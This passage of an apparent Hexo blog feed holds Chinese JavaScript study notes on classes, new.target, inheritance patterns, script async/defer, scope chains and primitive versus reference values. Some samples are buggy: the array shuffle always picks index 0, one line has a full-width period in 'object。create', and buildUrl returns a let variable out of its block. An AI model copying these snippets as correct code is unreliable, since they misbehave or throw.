Person(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">100</span>))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(Person.create())<span class="comment">//Person &#123;name: String, sayName: ƒ&#125;name: String &#123;&#x27;Jack&#x27;&#125;sayName: ()=&gt;console.log(this.name)[[Prototype]]: Object</span></span><br></pre></td></tr></table></figure><h1 id="关于继承"><a href="#关于继承" class="headerlink" title="关于继承"></a>关于继承</h1><p>[]: <a href="https://www.bookstack.cn/read/es6-3rd/spilt.1.docs-class-extends.md">https://www.bookstack.cn/read/es6-3rd/spilt.1.docs-class-extends.md</a></p><h1 id="关于super"><a href="#关于super" class="headerlink" title="关于super"></a>关于super</h1><p>[]: <a href="https://www.bookstack.cn/read/es6-3rd/spilt.3.docs-class-extends.md">https://www.bookstack.cn/read/es6-3rd/spilt.3.docs-class-extends.md</a></p><h1 id="抽象基类"><a href="#抽象基类" class="headerlink" title="抽象基类"></a>抽象基类</h1><p>通过new.target<strong>保存通过new关键字调用的类或函数</strong>，<strong>在普通函数中调用new.target返回undefined</strong>,通过在实例化时检测new.target是不是抽象基类，可以阻止对抽象基类的实例化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vehicle</span></span>&#123;</span><br><span class="line">           <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="built_in">console</span>.log(<span class="keyword">new</span>.target);</span><br><span class="line">               <span class="keyword">if</span>(<span class="keyword">new</span>.target===Vehicle)&#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Vehicle cannot be directly instantiated&#x27;</span>)</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="class"><span class="keyword">class</span> <span class="title">Bus</span> <span class="keyword">extends</span> <span class="title">Vehicle</span></span>&#123;&#125;</span><br><span class="line">       <span class="keyword">new</span> Bus();</span><br><span class="line">       <span class="keyword">new</span> Vehicle()<span class="comment">//testIframe.html:193 Uncaught Error: Vehicle cannot be directly instantiated</span></span><br></pre></td></tr></table></figure><h1 id="继承内置类型"><a href="#继承内置类型" class="headerlink" title="继承内置类型"></a>继承内置类型</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuperArray</span> <span class="keyword">extends</span> <span class="title">Array</span></span>&#123;</span><br><span class="line">           <span class="function"><span class="title">shuffle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="built_in">this</span>.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">                   <span class="keyword">let</span> j=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random(<span class="number">0</span>,i+<span class="number">1</span>));<span class="comment">//0-i+1向下取整</span></span><br><span class="line">                   [<span class="built_in">this</span>[i],<span class="built_in">this</span>[j]]=[<span class="built_in">this</span>[j],<span class="built_in">this</span>[i]]</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">let</span> a=<span class="keyword">new</span> SuperArray(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">       a.shuffle()</span><br><span class="line">       <span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;类构造函数&quot;&gt;&lt;a href=&quot;#类构造函数&quot; class=&quot;headerlink&quot; title=&quot;类构造函数&quot;&gt;&lt;/a&gt;类构造函数&lt;/h1&gt;&lt;p&gt;方法名constructor会告诉解释器在使用new操作符创建类的新实例时，应该调用这个函数，构造函数的定义不是必须</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>async 和defer</title>
    <link href="https://coloey.github.io/2022/04/15/async-%E5%92%8Cdefer/"/>
    <id>https://coloey.github.io/2022/04/15/async-%E5%92%8Cdefer/</id>
    <published>2022-04-15T00:51:47.000Z</published>
    <updated>2022-04-15T01:02:46.471Z</updated>
    
    <content type="html"><![CDATA[<p>script元素包含async属性和defer属性：</p><p>async:可选，表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载，<strong>只对外部脚本文件有效</strong>，标记过async的<strong>脚本并不保证能按照它们出现的次序执行</strong></p><p>defer:可选，表示脚本可以延迟到文档完全被解析和渲染后再执行，相当于告诉<strong>浏览器立即下载，延迟执行</strong>，且按照顺序执行</p><p><strong>只对外部脚本有效</strong>，在IE7及更早版本中，对行内脚本也可以指定这个属性</p><p>如果把script标签放在head标签里，意味着必须把所有JavaScript代码都下载，加息和解释完成后，才能渲染压面页面在浏览器解析到body的其实标签时开始渲染。因此现代Web通常把js引用放在body元素中页面内容后面这样页面就会在处理js代码之前完全渲染页面</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;script元素包含async属性和defer属性：&lt;/p&gt;
&lt;p&gt;async:可选，表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载，&lt;strong&gt;只对外部脚本文件有效&lt;/strong&gt;，标记过async的&lt;strong&gt;脚本并不保证能按</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>组合继承和原型继承</title>
    <link href="https://coloey.github.io/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/"/>
    <id>https://coloey.github.io/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</id>
    <published>2022-04-14T10:11:28.000Z</published>
    <updated>2022-04-15T05:39:50.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h1><p>综合了原型链和盗用构造函数，将两者优点结合，使用原型链继承原型上的属性和方法，<strong>通过盗用构造函数继承实例属性</strong>，这样既可以把<strong>方法定义在原型上实现重用</strong>，又可以<strong>让每个实例都有自己的属性</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name=name;</span><br><span class="line">    <span class="built_in">this</span>.colors=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  SuperType.prototype.sayName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">      SuperType.call(<span class="built_in">this</span>,name);<span class="comment">//SuperType的构造函数绑定SubType的构造函数,自定义实例属性，第二次调用SuperType</span></span><br><span class="line">      <span class="built_in">this</span>.age=age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继承原型上的方法，让SubType的原型指向SuperType的实例,第一次调用SuperType</span></span><br><span class="line">SubType.prototype=<span class="keyword">new</span> SuperType();</span><br><span class="line">SubType.prototype.sayAge=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> instance1=<span class="keyword">new</span> SubType(<span class="string">&#x27;Ann&#x27;</span>,<span class="number">29</span>);</span><br><span class="line">instance1.colors.push(<span class="string">&quot;balck&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.colors);</span><br><span class="line">instance1.sayName();</span><br><span class="line">instance1.sayAge();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> instance2=<span class="keyword">new</span> SubType(<span class="string">&quot;Greg&quot;</span>,<span class="number">27</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance2.colors);</span><br><span class="line">instance2.sayName();</span><br><span class="line">instance2.sayAge();</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/1.jpg" alt="1"></p><h1 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//object.create()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;;<span class="comment">//创建一个构造函数</span></span><br><span class="line">    F.prototype=o;<span class="comment">//构造函数的原型指向参数对象o</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();<span class="comment">//返回F对象实例</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Ann&quot;</span>,</span><br><span class="line">    <span class="attr">friends</span>:[<span class="string">&quot;Mary&quot;</span>,<span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> anotherPerson=object(person);</span><br><span class="line">anotherPerson.friends.push(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person.friends);<span class="comment">// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;]</span></span><br></pre></td></tr></table></figure><p>object()函数创建一个临时构造函数，将传入对象赋值给这个构造函数原型，然后返回这个临时类型的一个实例。本质上，object()是队传入的对象执行了一次浅复制</p><p>这里的object函数相当与object.create()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Ann&quot;</span>,</span><br><span class="line">    <span class="attr">friends</span>:[<span class="string">&quot;Mary&quot;</span>,<span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> anotherPerson=object。create(person);</span><br><span class="line">anotherPerson.friends.push(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person.friends);<span class="comment">// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;]</span></span><br></pre></td></tr></table></figure><p>原型式继承适合不需要单独创建构造函数，但仍然需要在对象间共享信息的场合。</p><h1 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h1><p>与原型式继承比较接近的一种继承方式是寄生式继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAnother</span>(<span class="params">original</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> clone=object(original);<span class="comment">//通过调用函数创建一个新对象</span></span><br><span class="line">    clone.sayHi=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//以某种方式增强这个对象</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clone;<span class="comment">//返回这个对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Ann&quot;</span>,</span><br><span class="line">    <span class="attr">friends</span>:[<span class="string">&quot;Mary&quot;</span>,<span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> anotherPerson=createAnother(person);</span><br><span class="line">anotherPerson.sayHi();</span><br></pre></td></tr></table></figure><p>寄生式继承同样适合主要关注对象，而不在乎类型和构造函数的场景。痛过寄生式继承给对象添加函数会导致函数难以重用，与构造函数模式类似。</p><h1 id="寄生式组合继承"><a href="#寄生式组合继承" class="headerlink" title="寄生式组合继承"></a>寄生式组合继承</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritPrototype</span>(<span class="params">subType,superType</span>)</span>&#123;<span class="comment">//参数分别是子类和父类的构造函数</span></span><br><span class="line">   <span class="keyword">let</span> prototype=<span class="built_in">Object</span>.create(superType.prototype);<span class="comment">//先复制父类的原型对象</span></span><br><span class="line">    prototype.constructor=subType;<span class="comment">//增强对象，让新的原型对象的构造函数指向子类构造函数</span></span><br><span class="line">    subType.prototype=prototype;<span class="comment">//赋值对象，让子类原型指向新的原型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name=name;</span><br><span class="line">    <span class="built_in">this</span>.colors=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">   SuperType.prototype.sayName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">       SuperType.call(<span class="built_in">this</span>,name);<span class="comment">//SuperType的构造函数绑定SubType的构造函数,调用Supertype()</span></span><br><span class="line">       <span class="built_in">this</span>.age=age;</span><br><span class="line"> &#125;</span><br><span class="line">inheritPrototype(SubType,SuperType);</span><br><span class="line">SubType.prototype.sayAge=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.age);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">let</span> instance1=<span class="keyword">new</span> SubType(<span class="string">&#x27;Ann&#x27;</span>,<span class="number">29</span>);</span><br><span class="line"> instance1.colors.push(<span class="string">&quot;balck&quot;</span>);</span><br><span class="line"> <span class="built_in">console</span>.log(instance1.colors);</span><br><span class="line"> instance1.sayName();</span><br><span class="line"> instance1.sayAge();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>寄生式组合继承基本模式：</p><ul><li>先创建父类原型的一个副本prototype</li><li>给prototype设置constructor属性为subType,增强对象，解决由于重写原型导致默认constructor丢失问题</li><li>将新创建的对象赋值给子类型的原型</li></ul><p>只调用一次SuperType构造函数，效率最高</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;组合继承&quot;&gt;&lt;a href=&quot;#组合继承&quot; class=&quot;headerlink&quot; title=&quot;组合继承&quot;&gt;&lt;/a&gt;组合继承&lt;/h1&gt;&lt;p&gt;综合了原型链和盗用构造函数，将两者优点结合，使用原型链继承原型上的属性和方法，&lt;strong&gt;通过盗用构造函数继承实例属性&lt;</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>执行上下文和作用域</title>
    <link href="https://coloey.github.io/2022/04/14/%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
    <id>https://coloey.github.io/2022/04/14/%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/</id>
    <published>2022-04-14T08:21:59.000Z</published>
    <updated>2022-04-14T08:45:20.666Z</updated>
    
    <content type="html"><![CDATA[<p>执行上下文有全局上下文和函数上下文，块级上下文：</p><p>上下文中的代码在执行时，会创建变量对象的一个作用域链，这个作用域链决定了各级上下文中的代码在访问变量和函数时的顺序，代码正在执行的上下文的变量对象始终位于作用域链的最前端，如果上下文时函数，则其活动对象用作变量对象，作用域链中的下一个变量对象来自包含上下文…以此类推至全局上下文，<strong>全局上下文变量对象始终是作用域链的最后一个变量对象（window)</strong></p><h2 id="作用域链增强"><a href="#作用域链增强" class="headerlink" title="作用域链增强"></a>作用域链增强</h2><p>执行上下文主要有全局上下文和函数上下文两种（eval()调用内部存在第三种上下文），但有其他方式增强作用域链，</p><p>try/catch语句中的catch块</p><p>with语句</p><p>这两种情况会在作用域链的前端添加一个变量对象，对with语句来说，会向作用域链前端添加指定对象，对catch语句，会创建一个新的变量对象，这个变量对象会包含要抛出的错误对象的声明</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> qs=<span class="string">&quot;?debug=true&quot;</span>;</span><br><span class="line">    <span class="function"><span class="title">with</span>(<span class="params">location</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> url=href+qs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>with语句将location对象作为上下文，因此location会被添加到作用域链的前端</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;执行上下文有全局上下文和函数上下文，块级上下文：&lt;/p&gt;
&lt;p&gt;上下文中的代码在执行时，会创建变量对象的一个作用域链，这个作用域链决定了各级上下文中的代码在访问变量和函数时的顺序，代码正在执行的上下文的变量对象始终位于作用域链的最前端，如果上下文时函数，则其活动对象用作变量</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>原始值与引用值及确定类型</title>
    <link href="https://coloey.github.io/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/"/>
    <id>https://coloey.github.io/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/</id>
    <published>2022-04-14T07:04:04.000Z</published>
    <updated>2022-04-14T08:21:25.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原始值和引用值"><a href="#原始值和引用值" class="headerlink" title="原始值和引用值"></a>原始值和引用值</h1><p>ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。</p><p>引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><h2 id="动态属性"><a href="#动态属性" class="headerlink" title="动态属性"></a>动态属性</h2><p>引用值可以随时添加，修改删除属性。</p><p>而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name1=<span class="string">&quot;Nicholas&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> name2=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;Matt&quot;</span>);</span><br><span class="line">name1.age=<span class="number">27</span>;</span><br><span class="line">name2.age=<span class="number">26</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name1.age);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(name2.age);<span class="comment">//26</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name1);<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name2);<span class="comment">//object</span></span><br></pre></td></tr></table></figure><h2 id="复制值"><a href="#复制值" class="headerlink" title="复制值"></a>复制值</h2><p>通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> num2=num1;</span><br></pre></td></tr></table></figure><p>num1和num2相互独立，num2是num1的副本</p><p>当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">let</span> obj2=obj1;</span><br><span class="line">obj1.name=<span class="string">&quot;Nic&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj2.name);<span class="comment">//Nic</span></span><br></pre></td></tr></table></figure><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addTen</span>(<span class="params">num</span>)</span>&#123;<span class="comment">//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count</span></span><br><span class="line">    num+=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">let</span> res=addTen(count);</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//20，没有变化</span></span><br><span class="line"><span class="built_in">console</span>.log(res);<span class="comment">//30</span></span><br></pre></td></tr></table></figure><p>如果是对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">obj.name=<span class="string">&quot;Nic&quot;</span>；<span class="comment">//此时多了一个obj指针指向person,将name改为Nic</span></span><br><span class="line">    obj=<span class="keyword">new</span> <span class="built_in">Object</span>();<span class="comment">//又创建一个指针，指向内存其他位置</span></span><br><span class="line">    obj.name=<span class="string">&quot;Greg&quot;</span>;<span class="comment">//函数调用结束，obj被销毁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">setName(person);</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//&#x27;Nic&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h1><p>typeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object</p><p>typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。</p><h1 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h1><p>如果变量是给定引用类型的实例，则instanceof操作符返回true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//变量person是Object吗</span></span><br></pre></td></tr></table></figure><p>按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原始值和引用值&quot;&gt;&lt;a href=&quot;#原始值和引用值&quot; class=&quot;headerlink&quot; title=&quot;原始值和引用值&quot;&gt;&lt;/a&gt;原始值和引用值&lt;/h1&gt;&lt;p&gt;ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Unde</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>原始值与引用值及确定类型</title>
    <link href="https://coloey.github.io/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/"/>
    <id>https://coloey.github.io/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/</id>
    <published>2022-04-14T07:04:04.000Z</published>
    <updated>2022-04-15T01:20:57.283Z</updated>
    
